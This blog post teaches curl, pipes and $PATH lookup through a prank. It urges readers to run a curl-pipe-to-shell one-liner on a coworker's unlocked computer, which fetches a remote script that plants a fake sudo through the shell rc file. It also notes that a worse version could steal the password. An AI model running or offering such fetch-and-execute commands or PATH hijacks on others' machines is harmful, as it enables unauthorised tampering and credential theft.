---
title: Evil Sudo
date: "2019-10-18"
---

This article assumes basic knowledge of the command-line. It also assumes you are on Linux or Mac.

There is also a video to accompany this blog post if you prefer.
`youtube: RrgxRXZf0vI`

## Want to infuriate a coworker?

1. Wait until they leave their computer unlocked.
2. Open a terminal and run this command:

```
curl files.tomontheinternet.com/evil-sudo.sh | sh
```

3. Close the terminal.

Now, whenever they try to use sudo, they'll see this:

```
10d20d7815 EXCEPTION unknown (0313)
```

Googling won't help them, because that error is utter nonsense.

## How does this work?

To understand what's happening, you need to understand the following things:

1. What `curl` is.
2. How you can pipe text to a shell.
3. What `evil-sudo.sh` does, and how the shell (command-line) determines which programs to run.

## What's curl?

Curl takes a URL, makes an HTTP request, and returns the response right in the terminal. Curl can do a lot more than that, but for us, this is enough.

Type `curl https://www.google.com` into your terminal. You should now see a wall of text. That text is the HTML of Google's landing page.

Now type `curl files.tomontheinternet.com/evil-sudo.sh`. I _promise_ nothing bad will happen. What you see now is a shell script I wrote and hosted online. Curl went out and got it for you.

## Sending text to a shell.

The pipe command looks like a pipe: `|`. It takes the output of one command and sends it to another command.

Type `sh` into your terminal. You are now in an `sh` shell. It's a lot like a Bash or Z shell. You can play around in this shell if you want. Then type `exit` to get back to your normal shell.

Type `echo "echo hi" | sh` into your terminal. This will send the text "echo hi" to the `sh` shell to be run. `sh` will run the command return the value, which is "hi".

So, looking at the command from the start of this blog post, can you see what `curl files.tomontheinternet.com/evil-sudo.sh | sh` does?

It takes the result of `curl files.tomontheinternet.com/evil-sudo.sh`, which is a shell script, and sends it to `sh`. `sh` then runs the shell script.

So, running `curl files.tomontheinternet.com/evil-sudo.sh | sh` downloads a shell script called `evil-sudo.sh` and runs it on your computer as you.

## What does `evil-sudo.sh` do?

Here's what `evil-sudo.sh` DOESN'T do: it doesn't modify your `sudo` command. It can't do that, because it doesn't have root access.

Unix-based systems have a `$PATH` variable. To see yours, type `echo $PATH`. This variable tells your shell where to find programs. Your shell looks, _in order_, through these directories to see if a program exists. When it finds a program, it runs it.

`evil-sudo.sh` adds a directory to your \$PATH and then creates a fake sudo program in that directory. It does this by determining what shell you are using, and adding a line to your `rc` file. So far, it only supports `bash` and `zsh`, but that covers 95% of all users. Now, when you run the `sudo` command, your shell finds the fake sudo program _first_ and uses the fake sudo instead of the real sudo.

Don't worry though! `evil-sudo.sh` is harmless.

## This could be much worse

`evil-sudo.sh` is annoying, but it could be much worse. It could pretend to be the real sudo command, and steal your password. Once it has your password, it could delete all files on your computer. Scary.

Make sure you only run commands you trust!

## Learn more

The source code and a command to remove `evil-sudo.sh` are available [here](https://github.com/tom-on-the-internet/evil-sudo).

